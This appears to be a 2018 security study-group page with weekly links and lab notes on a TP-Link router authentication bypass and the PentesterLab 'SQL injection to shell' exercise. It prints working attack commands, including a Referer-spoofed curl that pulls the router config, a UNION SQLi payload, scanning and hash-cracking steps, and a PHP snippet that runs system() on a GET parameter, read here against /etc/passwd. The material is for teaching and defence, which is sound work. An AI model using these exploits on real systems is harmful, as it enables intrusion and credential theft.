.. include:: /pentest_links.txt


*************************************************
2018-06-30 Links, home routers, PentesterLab SQLi
*************************************************


Links and updates this week
===========================


Links around the web
--------------------


Cloud
^^^^^

#. `How to use login verification <https://help.twitter.com/en/managing-your-account/two-factor-authentication#security-key>`_ - Twitter adds FIDO U2F keys and TOTP 2FA

#. `Rewards of Up to $500,000 Offered for FreeBSD, OpenBSD, NetBSD, Linux Zero-Days <https://www.bleepingcomputer.com/news/security/rewards-of-up-to-500-000-offered-for-freebsd-openbsd-netbsd-linux-zero-days/>`_

#. `STARTTLS Everywhere - Safer Hops for Email <https://starttls-everywhere.org/>`_ and `A Technical Deep Dive into STARTTLS Everywhere <https://www.eff.org/deeplinks/2018/06/technical-deep-dive-starttls-everywhere>`_


Tech
^^^^

#. `Breaking LTE on Layer Two <https://alter-attack.net/media/breaking_lte_on_layer_two.pdf>`_, `LTE wireless connections used by billions aren’t as secure as we thought <https://arstechnica.com/information-technology/2018/06/lte-wireless-connections-used-by-billions-arent-as-secure-as-we-thought/>`_,  and `Security Flaws Disclosed in LTE (4G) Mobile Telephony Standard <https://www.bleepingcomputer.com/news/security/security-flaws-disclosed-in-lte-4g-mobile-telephony-standard/>`_

#. `Researchers: Last Year’s ICOs Had Five Security Vulnerabilities on Average <https://www.bleepingcomputer.com/news/security/researchers-last-year-s-icos-had-five-security-vulnerabilities-on-average/>`_

#. `Time to “Hello, World”: VMs vs. containers vs. PaaS vs. FaaS <https://cloudplatform.googleblog.com/2018/06/Time-to-Hello-World-VMs-vs-containers-vs-PaaS-vs-FaaS.html>`_

#. `Google is adding DRM to all Android apps, but it's for the right reasons <https://www.androidcentral.com/google-drm-android-apps>`_

#. `Power to peep-all: Inference Attacks by Malicious Batteries on Mobile Devices <https://0f675898-a-62cb3a1a-s-sites.googlegroups.com/site/silbersteinmark/Home/popets18power.pdf>`_

#. `Hyperthreading under scrutiny with new TLBleed crypto key leak <https://arstechnica.com/gadgets/2018/06/tlbleed-a-new-way-to-leak-crypto-keys-on-hyperthreaded-processors/>`_

#. `Scammers abuse multilingual domain names <https://www.bbc.com/news/technology-44612317>`_

#. `Wi-Fi Alliance® introduces Wi-Fi CERTIFIED WPA3™ security <https://www.wi-fi.org/news-events/newsroom/wi-fi-alliance-introduces-wi-fi-certified-wpa3-security>`_ and `WPA3 Standard Officially Launches With New Fi-Fi Security Features <https://thehackernews.com/2018/06/wpa3-wifi-security-standard.html>`_

#. `Opening the Black Box of Payment Terminal Security <https://versprite.com/blog/payment-terminal-security/>`_


Tools
^^^^^

#. `React From Zero <https://github.com/kay-is/react-from-zero>`_

#. `h1-search <https://github.com/dsopas/h1-search>`_

#. `Free Thanatos Ransomware Decryption Tool Released <https://thehackernews.com/2018/06/free-ransomware-decryption-tools.html>`_

#. `Shellcoding an Arm64 In-Memory Reverse TCP Shell with Frida <https://versprite.com/blog/application-security/frida-engage-part-two-shellcoding-an-arm64-in-memory-reverse-tcp-shell-with-frida/>`_


Study links
^^^^^^^^^^^

#. `Passive Reconnaissance <https://www.securitysift.com/passive-reconnaissance/>`_

#. `WARNING: WordPress File Delete to Code Execution <https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/>`_

   ... authenticated arbitrary file deletion vulnerability in the WordPress core that can lead to attackers executing arbitrary code. The vulnerability was reported **7 months ago** to the WordPress security team but still remains unpatched. The long time elapsed since the initial reporting without any patch or concrete plans has led us to the decision to make it public.

#. `RAMPAGE AND GUARDION - Vulnerabilities in modern phones enable unauthorized access <https://rampageattack.com/>`_, `RAMpage Attack Explained - Exploiting RowHammer On Android Again! <https://thehackernews.com/2018/06/android-rowhammer-rampage-hack.html>`_, and `Every Android Device Since 2012 Impacted by RAMpage Vulnerability <https://www.bleepingcomputer.com/news/security/every-android-device-since-2012-impacted-by-rampage-vulnerability/>`_

#. `HTTPS Is Easy! <https://httpsiseasy.com/>`_

#. `All-Radio 4.27 Portable Can't Be Removed? Then Your PC is Severely Infected <https://www.bleepingcomputer.com/news/security/all-radio-427-portable-cant-be-removed-then-your-pc-is-severely-infected/>`_

#. `Playing with Relayed Credentials <https://www.coresecurity.com/blog/playing-relayed-credentials>`_

#. `The Old and New: Current Trends in Web-based Threats <https://researchcenter.paloaltonetworks.com/2018/06/unit42-the-old-and-new-current-trends-in-web-based-threats/>`_

#. `RANCOR: Targeted Attacks in South East Asia Using PLAINTEE and DDKONG Malware Families <https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/>`_

#. `Pbot: evolving adware <https://securelist.com/pbot-evolving-adware/86242/>`_

#. `WebAssembly: potentials and pitfalls <https://www.forcepoint.com/blog/security-labs/webassembly-potentials-and-pitfalls>`_

#. `Documenting and Attacking a Windows Defender Application Control Feature the Hard Way - A Case Study in Security Research Methodology <https://posts.specterops.io/documenting-and-attacking-a-windows-defender-application-control-feature-the-hard-way-a-case-73dd1e11be3a>`_

#. `Shelling Apache Felix With Java Bundles <https://posts.specterops.io/shelling-apache-felix-with-java-bundles-2450d3a099a?gi=89d9b2c56f4a>`_

#. `DEMONSTRATING REFLECTED VERSUS DOM BASED XSS <https://littlemaninmyhead.wordpress.com/2018/06/24/demonstrating-reflected-versus-dom-based-xss/>`_

#. `ASLR PROTECTION FOR STATICALLY LINKED EXECUTABLES <https://www.leviathansecurity.com/blog/aslr-protection-for-statically-linked-executables>`_

#. `JSgen.py – bind and reverse shell JS code generator for SSJI in Node.js with filter bypass encodings <https://pentesterslife.blog/2018/06/28/jsgen/>`_

#. `Analyzing WebAssembly binaries <https://www.forcepoint.com/blog/security-labs/analyzing-webassembly-binaries>`_

#. `Overcoming (some) Spectre browser mitigations <https://alephsecurity.com/2018/06/26/spectre-browser-query-cache/>`_

#. `Patching DoublePulsar to Exploit Windows Embedded Machines <https://capt-meelo.github.io/pentest/2018/06/26/patching-doublepulsar.html>`_


Privacy links
^^^^^^^^^^^^^

#. `Smart-home technology becomes the newest tool of domestic abusers <https://www.seattletimes.com/nation-world/smart-home-technologybecomes-the-newest-tool-of-domestic-abusers/>`_

#. `Facial recognition found Capital Gazette suspect among 10M photos <https://arstechnica.com/tech-policy/2018/06/maryland-cops-facial-recognition-to-id-capital-gazette-shooter-worked-well/>`_


Cultural/Legal/Political
^^^^^^^^^^^^^^^^^^^^^^^^

#. `The Wiretap Rooms - The NSA's Hidden Spy Hubs in Eight U.S. Cities <https://theintercept.com/2018/06/25/att-internet-nsa-spy-hubs/>`_

#. `We Still Need More HTTPS: Government Middleboxes Caught Injecting Spyware, Ads, and Cryptocurrency Miners <https://www.eff.org/deeplinks/2018/03/we-still-need-more-https-government-middleboxes-caught-injecting-spyware-ads-and>`_

#. `Pentagon Puts Cyberwarriors on the Offensive, Increasing the Risk of Conflict <https://www.wral.com/pentagon-puts-cyberwarriors-on-the-offensive-increasing-the-risk-of-conflict/17634489/>`_

#. `Google De-lists AntiPolygraph.org on Key Search Terms <https://antipolygraph.org/blog/2018/06/28/google-de-lists-antipolygraph-org-on-key-search-terms/>`_

#. `The GDPR and Browser Fingerprinting: How It Changes the Game for the Sneakiest Web Trackers <https://www.eff.org/deeplinks/2018/06/gdpr-and-browser-fingerprinting-how-it-changes-game-sneakiest-web-trackers>`_

#. `Facial recognition software is not ready for use by law enforcement <https://techcrunch.com/2018/06/25/facial-recognition-software-is-not-ready-for-use-by-law-enforcement/>`_ and `Facial recognition to be deployed by police across London, sparking human rights concerns <https://www.independent.co.uk/news/uk/home-news/facial-recognition-london-police-accuracy-human-rights-crime-database-a8422056.html>`_

#. `Border Spy Tech Shouldn’t Be a Requirement for a Path to Citizenship <https://www.eff.org/deeplinks/2018/06/border-spy-tech-shouldnt-be-requirement-path-citizenship>`_

#. `Venezuela blocks access to the Tor network <https://www.accessnow.org/venezuela-blocks-tor/>`_

#. `Feds arrest 35 in undercover darknet sting targeting sellers of 'illicit goods' <https://www.cnet.com/news/feds-arrest-35-in-undercover-darknet-sting-targeting-sellers-of-illicit-goods/>`_

#. `EFF Pressure Results in Increased Disclosure of Abuse of California’s Law Enforcement Databases <https://www.eff.org/deeplinks/2016/03/eff-pressure-results-increased-disclosure-abuse-californias-law-enforcement>`_

#. `WHISTLEBLOWER REALITY WINNER, CHARGED UNDER THE ESPIONAGE ACT FOR HELPING TO INFORM PUBLIC OF RUSSIAN ELECTION MEDDLING, PLEADS GUILTY <https://theintercept.com/2018/06/26/reality-winner-plea-deal/>`_

#. `Europe's New Link Tax Will Enshrine Big Tech's Stranglehold Over the Internet <https://motherboard.vice.com/en_us/article/9k8vd5/europe-link-tax-copyright-reform>`_ and `How the EU copyright proposal will hurt the web and Wikipedia <https://blog.wikimedia.org/2018/06/29/eu-copyright-proposal-will-hurt-web-wikipedia/>`_

#. `California approves privacy rules opposed by ISPs and tech companies <https://arstechnica.com/tech-policy/2018/06/california-approves-privacy-rules-opposed-by-isps-and-tech-companies/>`_


Hacking links
^^^^^^^^^^^^^

#. `The Biggest Digital Heist in History Isn’t Over Yet <https://www.bloomberg.com/news/features/2018-06-25/the-biggest-digital-heist-in-history-isn-t-over-yet>`_

   Carbanak’s suspected ringleader is under arrest, but $1.2 billion remains missing, and his malware attacks live on.

#. `A massive cache of law enforcement personnel data has leaked <https://www.zdnet.com/article/a-massive-cache-of-law-enforcement-personnel-data-has-leaked/>`_

#. `Github Gentoo organization hacked <https://www.gentoo.org/news/2018/06/28/Github-gentoo-org-hacked.html>`_ and `Github Account of Gentoo Linux Hacked, Code Replaced With Malware <https://thehackernews.com/2018/06/gentoo-linux-github.html>`_

#. `Facebook faces new accusation of data leak via quiz app <https://www.politico.eu/article/facebook-faces-new-potential-data-leak-through-quiz-apps/>`_ and `This popular Facebook app publicly exposed your data for years <https://medium.com/@intideceukelaire/this-popular-facebook-app-publicly-exposed-your-data-for-years-12483418eff8>`_

#. `ProtonMail DDoS Attacks Are a Case Study of What Happens When You Mock Attackers <https://www.bleepingcomputer.com/news/security/protonmail-ddos-attacks-are-a-case-study-of-what-happens-when-you-mock-attackers/>`_

#. `FileZilla_3.29.0 bundled malware? <https://forum.filezilla-project.org/viewtopic.php?t=48441>`_

#. `Hundreds of Hotels Affected by Data Breach at Hotel Booking Software Provider <https://www.bleepingcomputer.com/news/security/hundreds-of-hotels-affected-by-data-breach-at-hotel-booking-software-provider/>`_

#. `HPE Integrated Lights-Out 4, 5 (iLO 4, 5), Remote Unauthorized Modification of Information <https://support.hpe.com/hpsc/doc/public/display?docLocale=en_US&docId=emr_na-hpesbhf03844en_us>`_

#. `Ticketmaster Suffers Security Breach - Personal and Payment Data Stolen <https://thehackernews.com/2018/06/ticketmaster-data-breach.html>`_

#. `Typeform, Popular Online Survey Software, Suffers Data Breach <https://thehackernews.com/2018/06/typeform-survey-software.html>`_


Study this week
===============


Home routers
------------


TP-Link TL-WR840N/TL-WR841N - Authenticaton Bypass
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

From `TP-Link TL-WR840N/TL-WR841N - Authenticaton Bypass <https://www.exploit-db.com/exploits/44781/>`_:

  This issue is caused by improper session handling on /cgi/ Folder or /cgi
  file found by Touhid Shaikh (BlackFog Team Member).

  If any attacker sends Referer Header with its request and sets Referer:
  http://192.168.0.1/mainFrame.htm dan its no authentication required and an
  attacker can do router's action without authentication.
  below are some of few examples you can see. But the attacker can do mostly
  all of the action on a router without Authentication.

  NOTE:  Except admin's password change bcz its required current password for
  changing

Downloading the configuration is illustrated via:

.. code-block:: bash
  :emphasize-lines: 7

  ROUTER=192.168.0.1
  # This will fail
  curl -i -s -k -X GET \
    http://$ROUTER/cgi/conf.bin
  # This will succeed
  curl -s -k -X GET \
    -H "Referer: http://$ROUTER/mainFrame.htm" \
    http://$ROUTER/cgi/conf.bin


TP-Link TL-WR841N firmware update history
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Here goes the history of the last 5 versions for the TP-Link TL-WR841N:

.. list-table:: TP-Link TL-WR841N
   :widths: auto
   :header-rows: 1

   *
     - Version
     - Year introduced
     - Most recent firmware
     - Prior firmware
     - Prior firmware

   *
     - V13
     - 2017
     - 2018-02-24
     - 2017-10-20
     - 2017-08-14

   *
     - V12
     - 2016
     - 2016-08-03
     -
     -

   *
     - V11
     - 2015
     - 2015-10-21
     - 2015-10-20
     -

   *
     - V9
     - 2014
     - 2015-04-01
     - 2015-03-10
     - 2015-01-04

   *
     - V8
     - 2012
     - 2017-02-10
     - 2014-07-24
     - 2013-11-07

We could not locate a firmware update policy for this firewall. Aside from V8, products apprear to get perhaps 18 months of support after release. And many online sites don't specify which version they are selling, so you might buy a model which has already had its last firmware update. This is typical of many home firewall/routers.


PentesterLab - From SQL Injection to Shell
------------------------------------------


Getting started
^^^^^^^^^^^^^^^

The meetup writeup can be seen at :ref:`PentesterLabSQLi2Shell`. Below we have a few explanatory notes. 


SQL injection and prevention
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

The code attacked in :file:`cat.php` was the call to :program:`Picture::all($_GET["id"])`:

.. code-block:: php
  :emphasize-lines: 1

  $pics = Picture::all($_GET["id"]);

which is defined in :file:`classes/picture.php`:

.. code-block:: php
  :emphasize-lines: 5

  function all($cat=NULL,$order =NULL) {
    if (!isset($cat))
      $result= mysql_query("SELECT * FROM pictures where id=".$id);
    else
      $result= mysql_query("SELECT * FROM pictures where cat=".$cat);
    # ...
  }

Specifying "id=2 UNION ..." changes the intended query to one that can get at any table and column in the database. They key point is the query is a string including user input text.

To avoid SQL injection in PHP/MySQL use prepared statements as described in `How can I prevent SQL injection in PHP? <https://stackoverflow.com/questions/60174/how-can-i-prevent-sql-injection-in-php#60496>`_:

.. code-block:: php
  :emphasize-lines: 1,3-5,12,14,19-21

  # Option 1 - MySQLi

  $stmt = $dbConnection->prepare('SELECT * FROM employees WHERE name = ?');
  $stmt->bind_param('s', $name); // 's' specifies the variable type => 'string'
  $stmt->execute();

  $result = $stmt->get_result();
  while ($row = $result->fetch_assoc()) {
      // do something with $row
  }

  # Option 2 - PDO

  # Disable emulation of prepared statements
  $dbConnection = new PDO('mysql:dbname=dbtest;host=127.0.0.1;charset=utf8', 'user', 'pass');
  $dbConnection->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
  $dbConnection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

  # Prepared statement
  $stmt = $pdo->prepare('SELECT * FROM employees WHERE name = :name');
  $stmt->execute(array('name' => $name));
  foreach ($stmt as $row) {
      // do something with $row
  }


Use ``xsltproc`` with ``nmap``
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Here we illustrate the use of ``xsltproc`` with XML output from ``nmap -oA PREFIX``:

.. code-block:: bash
  :emphasize-lines: 2,5,9,11

  SUBNET=192.168.122.0/24
  sudo nmap -sn -PE -oA nmap_sn $SUBNET
  sudo chown $USER.$USER nmap_sn.*
  grep Up nmap_sn.gnmap | cut -d" " -f2 > targets.txt
  xsltproc nmap_sn.xml -o nmap_sn.html
  # 192.168.122.244

  TARGET=192.168.122.244
  sudo nmap -sT -sV -A -O -v --top-ports 10 -oA nmap_A $TARGET
  sudo chown $USER.$USER nmap_A.*
  xsltproc nmap_A.xml -o nmap_A.html
  # Linux 2.6.x
  # ports 22, 80


Further server identification (not used)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Leaking software version information can divulge a lot of information about the software being used:

.. code-block:: bash
  :emphasize-lines: 1-2,5-6,10-14,17-18,22-23,25,27-28

  # Get HTTP info
  curl --head http://$TARGET
  # HTTP/1.1 200 OK
  # Date: Sun, 24 Jun 2018 20:26:55 GMT
  # Server: Apache/2.2.16 (Debian)
  # X-Powered-By: PHP/5.3.3-7+squeeze14
  # Vary: Accept-Encoding
  # Content-Type: text/html

  socat - TCP:$TARGET:80,crlf <<EOF
  HEAD / HTTP/1.1
  Host: $TARGET

  EOF
  # HTTP/1.1 200 OK
  # Date: Sun, 24 Jun 2018 20:30:48 GMT
  # Server: Apache/2.2.16 (Debian)
  # X-Powered-By: PHP/5.3.3-7+squeeze14
  # Vary: Accept-Encoding
  # Content-Type: text/html

  # For HTTPS sites:
  curl -v --head https://example.com/

  socat - OPENSSL-CONNECT:example.com:443

  openssl s_client -connect example.com:443 <<EOF
  EOF

Exposing these headers let's you know not only the exact PHP version (PHP/5.3.3-7_squeeze14) but also narrowing the OS down to Debian 6.0.5 - 6.0.7. Debian 6 LTS ended Feb 2016 so any bugs after that are not fixed, and in fact any bugs after 6.0.8's release of Oct 20, 2013.

We know this because `Debian CDs/DVDs archive <https://cdimage.debian.org/mirror/cdimage/archive/>`_ allows seeing the software used in Debian 6.0.5 - 6.0.8. For example, start with `Index of /mirror/cdimage/archive/6.0.8 <https://cdimage.debian.org/mirror/cdimage/archive/6.0.8/>`_, then `Index of /mirror/cdimage/archive/6.0.8/i386 <https://cdimage.debian.org/mirror/cdimage/archive/6.0.8/i386/>`_, then `Index of /mirror/cdimage/archive/6.0.8/i386/list-dvd <https://cdimage.debian.org/mirror/cdimage/archive/6.0.8/i386/list-dvd/>`_, then download `debian-6.0.8-i386-DVD-1.list.gv <https://cdimage.debian.org/mirror/cdimage/archive/6.0.8/i386/list-dvd/debian-6.0.8-i386-DVD-1.list.gz>`_ and ``gunzip`` the list file. You'll see 6.0.8 uses php5_5.3.3-7+squeeze17_all.deb which is > php5_5.3.3-7+squeeze14. Both 6.0.6 and 6.0.7 use php5_5.3.3-7+squeeze14 while 6.0.5 uses php5_5.3.3-7+squeeze8. So either the system uses a patched 6.0.5, 6.0.6, or unpatched 6.0.7. After the exploit :file:`/etc/debian_version` shows the OS is "6.0.5".

For all these releases the kernel is 2.6.32+29.

Note that we don't need this information for the actual exploit as the exploit depends on coding weaknesses. But surely that old, unmaintained software has known exploits that can be found on the web.


Directory busting (not used)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

You can just open up the website in a browser to find the exploit, but here we illustrate 3 tools to find additional server directories. First we use ``wfuzz``:

.. code-block:: bash
  :emphasize-lines: 1,3,5-7

  # Install wfuzz (can alternatively use pip)
  sudo apt install libcurl4-openssl-dev -y  < /dev/null
  sudo apt install wfuzz -y  < /dev/null

  # Look for *.php files:
  wfuzz  -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 \
      http://$TARGET/FUZZ.php
  # ==================================================================
  # IDResponse   Lines      Word         Chars          Payload
  # ==================================================================

  # 000547:  C=200     92 L     141 W   1858 Ch  "cat"
  # 001290:  C=200     40 L      63 W    796 Ch  "header"
  # 001375:  C=200     71 L     103 W   1343 Ch  "index"
  # 002489:  C=200     70 L     108 W   1320 Ch  "show"

Alternatively you can use ``dirb`` to look for directories:

.. code-block:: bash
  :emphasize-lines: 1

  dirb http://$TARGET/ -o dirb.txt
  cat dirb.txt

Another tool is ``nikto``:

.. code-block:: bash
  :emphasize-lines: 1

  nikto -output nikto.html -C all -host $TARGET -port 80
  # open nikto.html

But for this exploit simply viewing the website in a broswer is enough to exploit this website.


URL encoding
^^^^^^^^^^^^

When you enter a SQL injection string string into the browser, the URL is encoded transforming "id=2 UNION SELECT 1,version(),3,4" to "id%3D2+UNION+SELECT+1%2Cversion%28%29%2C3%2C4".

``curl`` does URL encoding via ``--data-urlencode`` which defaults to HTTP POST, requiring adding ``--get`` for HTTP GET required in this exploit:

.. code-block:: bash
  :emphasize-lines: 3-4

  TARGET=192.168.122.244
  # Here goes a SQL injection possibility:
  curl --get --silent http://$TARGET/cat.php \
      --data-urlencode "id=2 UNION SELECT 1,version(),3,4" \
    | grep error
  # You have an error in your SQL syntax

In Python 3 ``urllib.parse.urlencode`` is used:



.. code-block:: bash
  :emphasize-lines: 1,3-4,6

  import urllib.parse

  params = {'id':'2 UNION SELECT 1,version(),3,4'}
  encoded = urllib.parse.urlencode(params)
  print(encoded)
  # id=2+UNION+SELECT+1%2Cversion%28%29%2C3%2C4


Dealing with hashes
^^^^^^^^^^^^^^^^^^^

First, you can simply search using a hash and may get the original hashed value, in this case "8efe310f9ab3efeae8d410a8e0166eb2" returns "P4ssw0rd".

To determine the type of hash can be determined by ``hashid``:

.. code-block:: bash
  :emphasize-lines: 1,3-

  # Determine the type of hash used by John the Ripper and hashcat
  HASH="8efe310f9ab3efeae8d410a8e0166eb2"
  hashid --john "$HASH"
  # raw-md5
  hashid --mode "$HASH"
  # mode 0

Now you can run ``john --format=raw-md5 ...`` or ``hashcat -m 0 ...`` to crack the hash.


Running php on the command line
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

PHP code can be tested using the CLI:


.. code-block:: bash
  :emphasize-lines: 2,4,6-

  # What php version?
  php --version
  # Run commands
  php -n -r 'system("date");'
  # Run file - parse_str mimics passing GET parameters
  cat > test.php <<'EOF'
  <?php
    parse_str(implode('&', array_slice($argv, 1)), $_GET);

    system($_GET['cmd']);
  ?>
  EOF
  # GET arguments after test.php
  php -n -f test.php cmd="cat /etc/passwd"
